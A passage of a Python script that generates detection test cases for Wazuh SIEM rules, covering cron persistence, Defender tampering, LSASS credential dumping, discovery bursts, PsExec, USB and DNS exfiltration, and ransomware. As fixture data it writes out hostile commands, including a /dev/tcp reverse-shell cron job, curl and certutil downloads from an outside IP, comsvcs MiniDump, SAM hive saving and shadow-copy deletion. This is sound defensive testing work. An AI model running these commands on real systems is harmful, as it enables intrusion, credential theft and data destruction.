         [sudo_line("portal", "user NOT in sudoers ; TTY=pts/1 ; PWD=/opt/pilgrim-portal ; USER=root ; COMMAND=/bin/bash", iso=True)],
         expect=[(1, 111704)]),
    case("UC17-08", "Script planted in the web root, run, then sudo by www-data -> 111705",
         [fim("/opt/pilgrim-portal/public/cmd.php"),
          audit_exec("/usr/bin/id", "id", serial=7001),
          sudo_line("www-data", "user NOT in sudoers ; TTY=unknown ; PWD=/opt/pilgrim-portal/public ; USER=root ; COMMAND=/usr/bin/id")],
         expect=[(1, 110701), (2, 110703), (3, 111705)]),
    case("UC17-10", "Web account runs an unexpected program, then sudo -> 111706",
         [audit_exec("/usr/bin/whoami", "whoami", serial=7101),
          sudo_line("www-data", "user NOT in sudoers ; TTY=unknown ; PWD=/opt/pilgrim-portal/public ; USER=root ; COMMAND=/bin/sh")],
         expect=[(1, 110702), (2, 111706)]),
    case("UC17-09", "Administrator uses sudo normally (no UC17 alert)",
         [sudo_line("ubuntu", "TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update")],
         forbid=[111704, 111705, 111706], kind="negative"),
]

# UC18 cron persistence (web01) ---------------------------------------------------------------------------
CRON_WWW = "/var/spool/cron/crontabs/www-data"
cases["uc18"] = [
    case("UC18-01", "/etc/crontab edited -> 111801",
         [fim("/etc/crontab", "modified", uid="0", user="root", diff="22a23\n> 15 3 * * * root /usr/local/bin/backup.sh\n")],
         expect=[(1, 111801)]),
    case("UC18-02", "New file in /etc/cron.d -> 111802",
         [fim("/etc/cron.d/pp-uc18-test", "added", uid="0", user="root")], expect=[(1, 111802)]),
    case("UC18-03", "Crontab created for www-data -> 111803",
         [fim(CRON_WWW, "added", uid="33", user="crontab")], expect=[(1, 111803)]),
    case("UC18-04", "cron.d job that downloads with curl -> 111804",
         [fim("/etc/cron.d/pp-uc18-test", "modified", uid="0", user="root",
              diff="1a2\n> */30 * * * * root /usr/bin/curl -s http://198.51.100.9/ping -o /dev/null\n")],
         expect=[(1, 111804)]),
    case("UC18-05", "www-data crontab gets a reverse-shell style job -> 111804",
         [fim(CRON_WWW, "modified", uid="33", user="crontab",
              diff="3a4\n> * * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'\n")],
         expect=[(1, 111804)]),
    case("UC18-06", "Downloader line that is commented out stays at 111801 (FP control)",
         [fim("/etc/crontab", "modified", uid="0", user="root", diff="22a23\n> # 0 * * * * root curl http://example.org | sh\n")],
         expect=[(1, 111801)], forbid=[111804], kind="negative"),
]

# UC19 defence evasion ---------------------------------------------------------------------------------------
DEFENDER = {"providerName": "Microsoft-Windows-Windows Defender", "providerGuid": "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}",
            "channel": "Microsoft-Windows-Windows Defender/Operational", "level": 4, "computer": "WIN10-LAB"}
DEFENDER_WARN = dict(DEFENDER, level=3)
EVENTLOG_SEC = {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}",
                "channel": "Security", "level": 4, "keywords": "0x4020000000000000", "computer": "WIN10-LAB"}
EVENTLOG_SYS = dict(EVENTLOG_SEC, channel="System", keywords="0x8000000000000000")
DEF_PRODUCT = {"Product Name": "Microsoft Defender Antivirus", "Product Version": "4.18.24090.11"}


def defender(event_id, system=DEFENDER, **data):
    return win(system, event_id, **dict(DEF_PRODUCT, **data))


EXCL = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions"
cases["uc19"] = [
    case("UC19-01", "Real-time protection turned off (5001) -> 111901",
         [defender(5001)], expect=[(1, 111901)]),
    case("UC19-02", "Antivirus scanning disabled logged as a warning (5012) -> 111901",
         [defender(5012, DEFENDER_WARN)], expect=[(1, 111901)]),
    case("UC19-03", "Exclusion added for a business folder -> 111902",
         [defender(5007, **{"Old Value": "", "New Value": EXCL + r"\Paths\D:\PortalBackups = 0x0"})],
         expect=[(1, 111902)]),
    case("UC19-04", "Exclusion added for C:\\Users\\Public -> 111903",
         [defender(5007, **{"Old Value": "", "New Value": EXCL + r"\Paths\C:\Users\Public = 0x0"})],
         expect=[(1, 111903)]),
    case("UC19-05", "Whole-drive exclusion -> 111903",
         [defender(5007, **{"Old Value": "", "New Value": EXCL + r"\Paths\C:\ = 0x0"})], expect=[(1, 111903)]),
    case("UC19-06", "Tamper Protection blocked a change (5013) -> 111904",
         [defender(5013, **{"Changed Type": "Reverted",
                            "Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\REAL-TIME PROTECTION\DisableRealtimeMonitoring = 0 -&gt; 1"})],
         expect=[(1, 111904)]),
    case("UC19-17", "Found live: turning protection back ON logs 5013 '= 0 -> 0' (no alert)",
         [defender(5013, **{"Changed Type": "Reverted",
                            "Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\REAL-TIME PROTECTION\DisableRealtimeMonitoring = 0 -&gt; 0"})],
         forbid=[111904], kind="negative"),
    case("UC19-07", "Add-MpPreference exclusion from PowerShell -> 111905",
         [proc(PS, r'powershell.exe -c "Add-MpPreference -ExclusionPath C:\Users\Public"')], expect=[(1, 111905)]),
    case("UC19-08", "reg.exe sets DisableAntiSpyware policy -> 111905",
         [proc(SYS32 + r"\reg.exe", r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')],
         expect=[(1, 111905)]),
    case("UC19-09", "sc stop WinDefend -> 111905",
         [proc(SYS32 + r"\sc.exe", r"sc stop WinDefend")], expect=[(1, 111905)]),
    case("UC19-10", "Set-MpPreference disables real-time monitoring (Wazuh 92008 path) -> 111906",
         [proc(PS, r"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")], expect=[(1, 111906)]),
    case("UC19-11", "Security log cleared (1102) -> 111907",
         [win(EVENTLOG_SEC, 1102)], expect=[(1, 111907)]),
    case("UC19-12", "Windows PowerShell log cleared (System 104) -> 111908",
         [win(EVENTLOG_SYS, 104)], expect=[(1, 111908)]),
    case("UC19-18", "wevtutil cl typed in PowerShell (quoted path) -> 111909",
         [proc(SYS32 + r"\wevtutil.exe", '"' + SYS32 + r'\wevtutil.exe" cl "Windows PowerShell"', parent=PS)],
         expect=[(1, 111909)]),
    case("UC19-13", "wevtutil cl from the command line -> 111909",
         [proc(SYS32 + r"\wevtutil.exe", r'wevtutil.exe cl "Windows PowerShell"')], expect=[(1, 111909)]),
    case("UC19-14", "Defender turned off, then the Security log cleared -> 111910",
         [defender(5001), win(EVENTLOG_SEC, 1102)], expect=[(1, 111901), (2, 111910)]),
    case("UC19-15", "Real-time protection turned back on (5000) - no UC19 alert",
         [defender(5000)], forbid=[111901, 111902, 111903, 111904], kind="negative"),
    case("UC19-16", "Log cleared with no Defender change before it stays 111907",
         [win(EVENTLOG_SEC, 1102)], expect=[(1, 111907)], forbid=[111910], kind="negative"),
]

# UC20 credential access -----------------------------------------------------------------------------------
def lsass_access(source, access, trace=r"C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Windows\System32\KERNELBASE.dll+2c13e"):
    return win(SYSMON, 10, RuleName="-", UtcTime="2026-11-11 10:00:00.000",
               SourceProcessGUID="{11111111-2222-3333-4444-555555555556}", SourceProcessId=5120, SourceThreadId=5124,
               SourceImage=source, TargetProcessGUID="{11111111-2222-3333-4444-555555555557}", TargetProcessId=712,
               TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess=access, CallTrace=trace,
               SourceUser=r"WIN10-LAB\ahmed", TargetUser=r"NT AUTHORITY\SYSTEM")


DUMP_TRACE = (r"C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Windows\System32\KERNELBASE.dll+2c13e|"
              r"C:\Windows\SYSTEM32\dbgcore.DLL+6dfb|C:\Windows\SYSTEM32\dbgcore.DLL+3bf2")
cases["uc20"] = [
    case("UC20-01", "Unknown tool opens LSASS with 0x1010 (Wazuh 92900 path) -> 112001",
         [lsass_access(r"C:\Users\Public\tool.exe", "0x1010")], expect=[(1, 112001)]),
    case("UC20-02", "Full access 0x1fffff that Wazuh 92900 does not list -> 112001",
         [lsass_access(r"C:\Users\ahmed\AppData\Local\Temp\x.exe", "0x1fffff")], expect=[(1, 112001)]),
    case("UC20-03", "Task Manager dump: MiniDumpWriteDump in the call stack -> 112002",
         [lsass_access(r"C:\Windows\System32\Taskmgr.exe", "0x1fffff", DUMP_TRACE)], expect=[(1, 112002)]),
    case("UC20-04", "rundll32 comsvcs.dll MiniDump -> 112003",
         [proc(SYS32 + r"\rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\l.dmp full")],
         expect=[(1, 112003)]),
    case("UC20-05", "reg save of the SAM hive (Wazuh 92026 path) -> 112004",
         [proc(SYS32 + r"\reg.exe", r"reg save HKLM\SAM C:\Users\Public\sam.save")], expect=[(1, 112004)]),
    case("UC20-06", "reg save of the SYSTEM hive (gap in Wazuh 92026) -> 112004",
         [proc(SYS32 + r"\reg.exe", r"reg save HKLM\SYSTEM Q:\sys.save")], expect=[(1, 112004)]),
    case("UC20-07", "Defender scanning LSASS (allow-listed path, no alert)",
         [lsass_access(r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe", "0x1fffff")],
         forbid=[112001, 112002], kind="negative"),
    case("UC20-10", "Found live: Defender opens LSASS with 0x1010 - Wazuh's 92900 silenced by tuning rule 112009",
         [lsass_access(r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26100.4-0\MsMpEng.exe", "0x1010")],
         expect=[(1, 112009)], forbid=[92900, 112001], kind="negative"),
    case("UC20-08", "Query-only access 0x1000 (no alert)",
         [lsass_access(r"C:\Users\Public\tool.exe", "0x1000")], forbid=[112001, 112002], kind="negative"),
    case("UC20-09", "Exporting one service key under HKLM\\SYSTEM (no alert)",
         [proc(SYS32 + r"\reg.exe", r"reg export HKLM\SYSTEM\CurrentControlSet\Services\PilgrimSync C:\backup\svc.reg")],
         forbid=[112004], kind="negative"),
]

# UC21 discovery burst ---------------------------------------------------------------------------------------
CMD = SYS32 + r"\cmd.exe"


def recon(exe, cmd, user=r"WIN10-LAB\ahmed", parent=CMD):
    return proc(SYS32 + "\\" + exe, cmd, parent=parent, user=user, ParentCommandLine=r"C:\Windows\system32\cmd.exe")


BURST = [recon("whoami.exe", "whoami /all"), recon("hostname.exe", "hostname"), recon("ipconfig.exe", "ipconfig /all"),
         recon("systeminfo.exe", "systeminfo"), recon("net.exe", "net localgroup administrators")]
cases["uc21"] = [
    case("UC21-01", "Five different discovery tools in a row -> 112110 on the fifth",
         BURST, expect=[(5, 112110)]),
    case("UC21-02", "A single discovery command stays silent (classified, counted, no alert)",
         BURST[:1], expect=[(1, 112109)], forbid=[112110], kind="negative"),
    case("UC21-03", "Domain trust discovery -> 112104",
         [recon("nltest.exe", "nltest /domain_trusts /all_trusts")], expect=[(1, 112104)]),
    case("UC21-04", "Admin re-runs ipconfig five times (same tool, no burst)",
         [recon("ipconfig.exe", "ipconfig /all") for _ in range(5)], forbid=[112110], kind="negative"),
    case("UC21-05", "net user ... /add is left to Wazuh's net.exe rules (not swallowed by the classifier)",
         [recon("net.exe", "net user backup01 P@ss-lab-only /add")], expect=[(1, 92039)], forbid=[112102, 112109]),
    case("UC21-06", "Burst after a LOLBin download on the same host -> 112111",
         [proc(SYS32 + r"\certutil.exe", r"certutil.exe -urlcache -split -f http://198.51.100.9/tool.exe C:\Users\Public\tool.exe")] + BURST,
         expect=[(1, 111201), (6, 112111)]),
    case("UC21-07", "Inventory commands from the management agent (excluded)",
         [recon(e, c, parent=r"C:\Windows\CCM\CcmExec.exe") for e, c in
          [("whoami.exe", "whoami"), ("hostname.exe", "hostname"), ("ipconfig.exe", "ipconfig"),
           ("systeminfo.exe", "systeminfo"), ("tasklist.exe", "tasklist")]],
         forbid=[112110], kind="negative"),
]

AGENT_EXE = r"C:\Program Files (x86)\ossec-agent\wazuh-agent.exe"
SCA_SCAN = [proc(SYS32 + r"\wbem\WMIC.exe", r'wmic useraccount where (sid like "S-1-5-21-%-500") get name',
                 parent=AGENT_EXE, user=r"NT AUTHORITY\SYSTEM", OriginalFileName="wmic.exe")] * 2 + [
            proc(SYS32 + r"\net.exe", "net user", parent=AGENT_EXE, user=r"NT AUTHORITY\SYSTEM"),
            proc(SYS32 + r"\net1.exe", r"C:\Windows\system32\net1 user", parent=SYS32 + r"\net.exe",
                 user=r"NT AUTHORITY\SYSTEM")] * 2
cases["uc21"] += [
    case("UC21-08", "Wazuh agent's own SCA scan (found live in the lab: wmic + net as SYSTEM) - no burst",
         SCA_SCAN, forbid=[112110], kind="negative"),
    case("UC21-09", "Admin runs several net.exe queries; net1.exe children are not counted again - no burst",
         [e for v in ("user", "localgroup", "accounts", "share", "view")
          for e in (recon("net.exe", f"net {v}"),
                    proc(SYS32 + r"\net1.exe", rf"C:\Windows\system32\net1 {v}", parent=SYS32 + r"\net.exe"))],
         forbid=[112110], kind="negative"),
]

# UC22 remote execution ---------------------------------------------------------------------------------------
SCM = {"providerName": "Service Control Manager", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
       "channel": "System", "level": 4, "keywords": "0x8080000000000000", "computer": "WIN10-LAB"}


def service(name, path, account="LocalSystem"):
    return win(SCM, 7045, ServiceName=name, ImagePath=path, ServiceType="user mode service",
               StartType="demand start", AccountName=account)


def pipe(name, image=r"C:\Windows\PSEXESVC.exe", eid=17):
    return win(SYSMON, eid, RuleName="-", EventType="CreatePipe" if eid == 17 else "ConnectPipe",
               UtcTime="2026-11-11 10:00:01.000", ProcessGuid="{11111111-2222-3333-4444-555555555558}",
               ProcessId=6100, PipeName=name, Image=image, User=r"NT AUTHORITY\SYSTEM")


cases["uc22"] = [
    case("UC22-01", "PsExec service installed -> 112201",
         [service("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe")], expect=[(1, 112201)]),
    case("UC22-02", "smbexec-style service running a cmd one-liner -> 112201",
         [service("BTOBTO", r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat")],
         expect=[(1, 112201)]),
    case("UC22-03", "Service binary in C:\\Users\\Public -> 112202",
         [service("PilgrimUpdate", r"C:\Users\Public\pupdate.exe")], expect=[(1, 112202)]),
    case("UC22-04", "PSEXESVC named pipe -> 112203",
         [pipe(r"\PSEXESVC-WIN10-LAB-4242-stdin")], expect=[(1, 112203)]),
    case("UC22-05", "Command started by PSEXESVC -> 112204",
         [proc(CMD, r"cmd /c whoami", parent=r"C:\Windows\PSEXESVC.exe", user=r"NT AUTHORITY\SYSTEM",
               ParentCommandLine=r"C:\Windows\PSEXESVC.exe")], expect=[(1, 112204)]),
    case("UC22-06", "Service install, then its pipe -> 112205",
         [service("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe"), pipe(r"\PSEXESVC")], expect=[(1, 112201), (2, 112205)]),
    case("UC22-07", "Normal software installs a service under Program Files (no UC22 alert)",
         [service("PilgrimPrinterHelper", r'"C:\Program Files\Pilgrim\PrinterHelper.exe"')],
         expect=[(1, 61138)], forbid=[112201, 112202], kind="negative"),
    case("UC22-08", "Defender platform update re-registers its service (no UC22 alert)",
         [service("WinDefend", r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"')],
         forbid=[112201, 112202], kind="negative"),
]

# UC23 USB exfiltration ---------------------------------------------------------------------------------------
def usb_plug():
    return win(SECURITY_OK, 6416, SubjectUserSid="S-1-5-18", SubjectUserName="WIN10-LAB$", SubjectDomainName="WORKGROUP",
               SubjectLogonId="0x3e7", DeviceId=r"USBSTOR\Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00\4C530001231122",
               DeviceDescription="SanDisk Cruzer Blade USB Device", ClassId="{4d36e967-e325-11ce-bfc1-08002be10318}",
               ClassName="DiskDrive", HardwareIds=r"USBSTOR\DiskSanDisk_Cruzer_Blade", CompatibleIds=r"USBSTOR\Disk",
               LocationInformation="-")


def usb_write(name, image=r"C:\Windows\explorer.exe", drive="E:"):
    return win(SYSMON, 11, RuleName="-", UtcTime="2026-11-11 10:05:00.000", ProcessGuid="{11111111-2222-3333-4444-555555555559}",
               ProcessId=3920, Image=image, TargetFilename=drive + "\\" + name, CreationUtcTime="2026-11-11 10:05:00.000",
               User=r"WIN10-LAB\ahmed")


PASSPORTS = [usb_write(f"PassportScans\\passport_{i:04d}.pdf") for i in range(1, 11)]
PHOTOS = [usb_write(f"Trip\\IMG_{i:04d}.jpg") for i in range(1, 11)]
cases["uc23"] = [
    case("UC23-01", "USB stick connected -> 112301", [usb_plug()], expect=[(1, 112301)]),
    case("UC23-02", "Ten holiday photos copied to E: -> 112303 (bulk, not identity documents)",
         PHOTOS, expect=[(10, 112303)]),
    case("UC23-03", "Ten passport scans copied to E: -> 112304", PASSPORTS, expect=[(10, 112304)]),
    case("UC23-04", "USB plugged in, then passport scans copied -> 112305",
         [usb_plug()] + PASSPORTS, expect=[(1, 112301), (11, 112305)]),
    case("UC23-05", "Three files copied to USB (below threshold, silent)",
         PASSPORTS[:3], forbid=[112303, 112304, 112305], kind="negative"),
]

# UC24 DNS tunnelling ------------------------------------------------------------------------------------------
import hashlib


def dns(name, image=PS):
    return win(SYSMON, 22, RuleName="-", UtcTime="2026-11-11 10:10:00.000", ProcessGuid="{11111111-2222-3333-4444-55555555555a}",
               ProcessId=6400, QueryName=name, QueryStatus="9003", QueryResults="-", Image=image, User=r"WIN10-LAB\ahmed")


TUNNEL = [dns(hashlib.sha1(str(i).encode()).hexdigest() + ".exfil.example.com") for i in range(20)]
cases["uc24"] = [
    case("UC24-01", "20 unique 40-character subdomains from one process in a minute -> 112402",
         TUNNEL, expect=[(20, 112402)]),
    case("UC24-02", "Lookup of an ngrok tunnel host -> 112403",
         [dns("2f1c-198-51-100-9.ngrok-free.app")], expect=[(1, 112403)]),
    case("UC24-03", "Lookup of an interactsh / OAST host -> 112403",
         [dns("c59gh2qk2v0000000000gdkyyyyyyyyyb.oast.fun")], expect=[(1, 112403)]),
    case("UC24-04", "Same long name repeated 20 times (cache refresh, no burst)",
         [dns(hashlib.sha1(b"x").hexdigest() + ".exfil.example.com") for _ in range(20)],
         forbid=[112402], kind="negative"),
    case("UC24-05", "Long AWS load-balancer names are excluded (no burst)",
         [dns(f"pilgrim-booking-api-prod-{i:04d}-1234567890.eu-central-1.elb.amazonaws.com") for i in range(20)],
         forbid=[112402], kind="negative"),
]

# UC25 ransomware behaviour ------------------------------------------------------------------------------------
SHARE = r"c:\pilgrimshare\passportscans"
DELETES = [fim(SHARE + f"\\passport_{i:04d}.pdf", "deleted", uid="S-1-5-32-544", user="Administrators") for i in range(1, 21)]
RENAMES = [fim(SHARE + f"\\passport_{i:04d}.pdf.locked", "added", uid="S-1-5-32-544", user="Administrators") for i in range(1, 21)]
SHADOWS = proc(SYS32 + r"\vssadmin.exe", r"vssadmin.exe delete shadows /all /quiet")
cases["uc25"] = [
    case("UC25-01", "20 files deleted from the share in a minute -> 112502", DELETES, expect=[(20, 112502)]),
    case("UC25-02", "Ransom note written to the share -> 112503",
         [fim(SHARE + r"\README_RESTORE_FILES.txt", "added", uid="S-1-5-32-544", user="Administrators")],
         expect=[(1, 112503)]),
    case("UC25-03", "Documents renamed to .pdf.locked -> 112504", RENAMES, expect=[(20, 112504)]),
    case("UC25-04", "vssadmin delete shadows -> 112505", [SHADOWS], expect=[(1, 112505)]),
    case("UC25-11", "Found live: vssadmin typed in PowerShell (quoted program path) -> 112505",
         [proc(SYS32 + r"\vssadmin.exe", '"' + SYS32 + r'\vssadmin.exe" delete shadows /for=Q: /quiet', parent=PS)],
         expect=[(1, 112505)]),
    case("UC25-05", "wmic shadowcopy delete -> 112505",
         [proc(SYS32 + r"\wbem\WMIC.exe", r"wmic shadowcopy where ""ID='{00000000-0000-0000-0000-000000000000}'"" delete",
               OriginalFileName="wmic.exe")], expect=[(1, 112505)]),
    case("UC25-06", "bcdedit disables recovery -> 112505",
         [proc(SYS32 + r"\bcdedit.exe", r"bcdedit /set {default} recoveryenabled No")], expect=[(1, 112505)]),
    case("UC25-07", "Shadow copies deleted, then mass encryption of the share -> 112506",
         [SHADOWS] + RENAMES, expect=[(1, 112505), (21, 112506)]),
    case("UC25-08", "Listing shadow copies (no alert)",
         [proc(SYS32 + r"\vssadmin.exe", r"vssadmin list shadows")], forbid=[112505], kind="negative"),
    case("UC25-09", "Five documents edited by staff (below threshold, silent)",
         [fim(SHARE + f"\\passport_{i:04d}.pdf", "modified", uid="S-1-5-32-544", user="Administrators") for i in range(1, 6)],
         forbid=[112502, 112504, 112506], kind="negative"),
]

if __name__ == "__main__":
    os.makedirs(OUT, exist_ok=True)
    total = 0
    for uc, lst in cases.items():
        with open(os.path.join(OUT, f"{uc}.json"), "w") as fh:
            json.dump({"use_case": uc.upper(), "cases": lst}, fh, indent=1)
        total += len(lst)
    print(f"wrote {total} cases in {len(cases)} files to {OUT}")
